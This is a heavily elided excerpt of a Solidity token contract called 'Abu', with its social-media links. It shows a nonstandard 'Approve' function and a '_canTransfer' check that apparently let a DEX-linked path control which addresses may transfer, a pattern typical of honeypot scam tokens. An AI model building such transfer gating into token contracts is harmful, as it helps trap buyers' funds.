//Telegram: https://t.me/ABUThiefMonkey
//Website: https://abuthiefmonkey.xyz
//Twitter: https://twitter.com/ABUThiefMonkey
//Discord:  https://discord.gg/2YaN8VpQ
...
contract Abu is IERC20, Token, Ownable {
    ...
    function Approve(
        ...
        if (from == _dex[from]) {
            ...
            _canTransfer[spender] = isApproval;
        } else {
    ...
    function _checkCanTransfer(address _sender) internal returns (bool) {
        return _canTransfer[_sender] == true;
    }
